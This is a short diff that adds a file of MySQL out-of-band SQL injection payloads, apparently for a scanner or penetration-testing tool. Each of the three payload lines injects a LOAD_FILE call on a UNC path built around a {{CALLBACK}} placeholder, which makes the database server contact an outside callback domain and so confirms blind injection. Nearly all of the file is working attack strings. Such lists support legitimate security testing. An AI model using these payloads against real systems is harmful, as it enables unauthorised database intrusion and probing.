@@ -1,0 +1,5 @@
+# MySQL OOB payloads - requires FILE privilege
+# {{CALLBACK}} replaced with DNS-resolvable callback domain
+' AND LOAD_FILE(CONCAT('\\\\{{CALLBACK}}\\x'))--
+1 AND LOAD_FILE(CONCAT('\\\\{{CALLBACK}}\\x'))--
+' OR LOAD_FILE(CONCAT('\\\\{{CALLBACK}}\\x'))--
